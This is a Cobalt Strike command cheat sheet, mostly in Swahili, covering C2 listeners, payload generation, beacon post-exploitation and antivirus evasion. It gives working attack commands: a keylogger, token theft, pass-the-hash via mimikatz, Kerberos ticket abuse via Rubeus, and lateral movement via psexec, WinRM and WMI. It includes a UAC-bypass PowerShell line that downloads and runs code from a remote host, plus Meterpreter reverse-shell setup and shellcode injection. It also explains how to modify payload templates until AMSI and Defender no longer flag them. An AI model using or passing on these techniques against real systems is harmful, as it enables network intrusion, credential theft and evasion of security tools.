# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` kisha unaweza kuchagua wapi kusikiliza, ni aina gani ya beacon ya kutumia (http, dns, smb...) na zaidi.

### Peer2Peer Listeners

Beacons za wasikilizaji hawa hazihitaji kuzungumza na C2 moja kwa moja, wanaweza kuwasiliana nayo kupitia beacons nyingine.

`Cobalt Strike -> Listeners -> Add/Edit` kisha unahitaji kuchagua TCP au SMB beacons

* **TCP beacon itaanzisha msikilizaji katika bandari iliyochaguliwa**. Kuungana na TCP beacon tumia amri `connect <ip> <port>` kutoka beacon nyingine
* **smb beacon itasikiliza katika pipename yenye jina lililochaguliwa**. Kuungana na SMB beacon unahitaji kutumia amri `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** kwa ajili ya faili za HTA
* **`MS Office Macro`** kwa hati ya ofisi yenye macro
* **`Windows Executable`** kwa .exe, .dll au huduma .exe
* **`Windows Executable (S)`** kwa **stageless** .exe, .dll au huduma .exe (bora stageless kuliko staged, chini ya IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Hii itazalisha script/executable ya kupakua beacon kutoka cobalt strike katika fomati kama: bitsadmin, exe, powershell na python

#### Host Payloads

Ikiwa tayari una faili unayotaka kuhifadhi kwenye seva ya wavuti nenda tu kwa `Attacks -> Web Drive-by -> Host File` na uchague faili ya kuhifadhi na usanidi wa seva ya wavuti.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
execute-assembly &#x3C;/path/to/executable.exe>

# Screenshots
printscreen    # Chukua picha moja kupitia njia ya PrintScr
screenshot     # Chukua picha moja
screenwatch    # Chukua picha za kawaida za desktop
## Nenda kwa View -> Screenshots kuziangalia

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes kuangalia funguo zilizopigwa

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Ingiza hatua ya portscan ndani ya mchakato mwingine
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;just write powershell cmd here>

# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Unda token ili kuiga mtumiaji katika mtandao
ls \\computer_name\c$ # Jaribu kutumia token iliyoundwa kufikia C$ katika kompyuta
rev2self # Acha kutumia token iliyoundwa na make_token
## Matumizi ya make_token yanazalisha tukio 4624: Akaunti imeingia kwa mafanikio. Tukio hili ni la kawaida katika eneo la Windows, lakini linaweza kupunguzika kwa kuchuja kwa Aina ya Ingia. Kama ilivyotajwa hapo juu, inatumia LOGON32_LOGON_NEW_CREDENTIALS ambayo ni aina ya 9.

# UAC Bypass
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Kama make_token lakini kuiba token kutoka kwa mchakato
steal_token [pid] # Pia, hii ni muhimu kwa hatua za mtandao, si hatua za ndani
## Kutoka kwa hati ya API tunajua kwamba aina hii ya kuingia "inaruhusu mwito kuiga token yake ya sasa". Hii ndiyo sababu matokeo ya Beacon yanasema Impersonated &#x3C;current_username> - inaimarisha token yetu iliyokopwa.
ls \\computer_name\c$ # Jaribu kutumia token iliyoundwa kufikia C$ katika kompyuta
rev2self # Acha kutumia token kutoka steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Fanya hivyo kutoka kwenye saraka yenye ruhusa ya kusoma kama: cd C:\
## Kama make_token, hii itazalisha tukio la Windows 4624: Akaunti imeingia kwa mafanikio lakini kwa aina ya kuingia ya 2 (LOGON32_LOGON_INTERACTIVE). Itabainisha mtumiaji anayepiga simu (TargetUserName) na mtumiaji anayegaiwa (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## Kutoka kwa mtazamo wa OpSec: Usifanye sindano ya kuvuka jukwaa isipokuwa ni lazima (mfano x86 -> x64 au x64 -> x86).

## Pass the hash
## Mchakato huu wa mabadiliko unahitaji kubadilisha kumbukumbu ya LSASS ambayo ni hatua ya hatari kubwa, inahitaji ruhusa za admin za ndani na si rahisi sana ikiwa Mchakato Ulinzi Mwanga (PPL) umewezeshwa.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Bila /run, mimikatz inazalisha cmd.exe, ikiwa unakimbia kama mtumiaji mwenye Desktop, ataona shell (ikiwa unakimbia kama SYSTEM uko sawa)
steal_token &#x3C;pid> #Kopa token kutoka kwa mchakato ulioanzishwa na mimikatz

## Pass the ticket
## Omba tiketi
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## Unda kikao kipya cha kuingia ili kutumia tiketi mpya (ili usifute ile iliyovunjika)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## Andika tiketi katika mashine ya mshambuliaji kutoka kwa kikao cha poweshell &#x26; ipakue
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Unda mchakato mpya na tiketi
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Kopa token kutoka kwa mchakato huo
steal_token &#x3C;pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Hatimaye, kopa token kutoka kwa mchakato huo mpya
steal_token &#x3C;pid>

# Lateral Movement
## Ikiwa token iliumbwa itatumika
jump [method] [target] [listener]
## Njia:
## psexec                    x86   Tumia huduma kuendesha kipande cha huduma EXE
## psexec64                  x64   Tumia huduma kuendesha kipande cha huduma EXE
## psexec_psh                x86   Tumia huduma kuendesha PowerShell one-liner
## winrm                     x86   Endesha script ya PowerShell kupitia WinRM
## winrm64                   x64   Endesha script ya PowerShell kupitia WinRM

remote-exec [method] [target] [command]
## Njia:
<strong>## psexec                          Tekeleza kwa mbali kupitia Meneja wa Udhibiti wa Huduma
</strong>## winrm                           Tekeleza kwa mbali kupitia WinRM (PowerShell)
## wmi                             Tekeleza kwa mbali kupitia WMI

## Ili kutekeleza beacon na wmi (haipo katika amri ya jump) pakua tu beacon na uitekeleze
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## Kwenye mwenyeji wa metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Kwenye cobalt: Listeners > Ongeza na weka Payload kuwa Foreign HTTP. Weka Host kuwa 10.10.5.120, Bandari kuwa 8080 na bonyeza Hifadhi.
beacon> spawn metasploit
## Unaweza tu kuanzisha vikao vya x86 Meterpreter na msikilizaji wa kigeni.

# Pass session to Metasploit - Through shellcode injection
## Kwenye mwenyeji wa metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Kimbia msfvenom na uandae msikilizaji wa multi/handler

## Nakili faili ya bin kwenye mwenyeji wa cobalt strike
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Ingiza shellcode ya metasploit katika mchakato wa x64

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, nenda kwa Attacks > Packages > Windows Executable (S), chagua msikilizaji unaotaka, chagua Raw kama aina ya Matokeo na chagua Tumia x64 payload.
## Tumia post/windows/manage/shellcode_inject katika metasploit kuingiza shellcode iliyozalishwa ya cobalt strike


# Pivoting
## Fungua proxy ya socks katika teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Avoiding AVs

### Artifact Kit

Kawaida katika `/opt/cobaltstrike/artifact-kit` unaweza kupata msimbo na templeti zilizotengenezwa awali (katika `/src-common`) za payloads ambazo cobalt strike itatumia kuzalisha beacons za binary.

Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) na backdoor iliyozalishwa (au tu na templeti iliyotengenezwa) unaweza kupata kile kinachosababisha mlinzi kuanzisha. Kawaida ni mfuatano. Hivyo unaweza tu kubadilisha msimbo unaozalisha backdoor ili mfuatano huo usionekane katika binary ya mwisho.

Baada ya kubadilisha msimbo, kimbia `./build.sh` kutoka kwenye saraka hiyo hiyo na nakili folda ya `dist-pipe/` ndani ya mteja wa Windows katika `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Usisahau kupakia skripti ya nguvu `dist-pipe\artifact.cna` kuonyesha Cobalt Strike kutumia rasilimali kutoka diski ambazo tunataka na si zile zilizopakiwa.

### Resource Kit

Folda ya ResourceKit ina mifano ya payloads za msingi wa skripti za Cobalt Strike ikijumuisha PowerShell, VBA na HTA.

Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) pamoja na mifano unaweza kupata kile ambacho mlinzi (AMSI katika kesi hii) hakipendi na kukibadilisha:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Kubadilisha mistari iliyogunduliwa kunaweza kuunda kiolezo ambacho hakiwezi kugundulika.

Usisahau kupakia skripti ya nguvu `ResourceKit\resources.cna` kuonyesha Cobalt Strike kutumia rasilimali kutoka diski ambazo tunataka na si zile zilizopakiwa.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

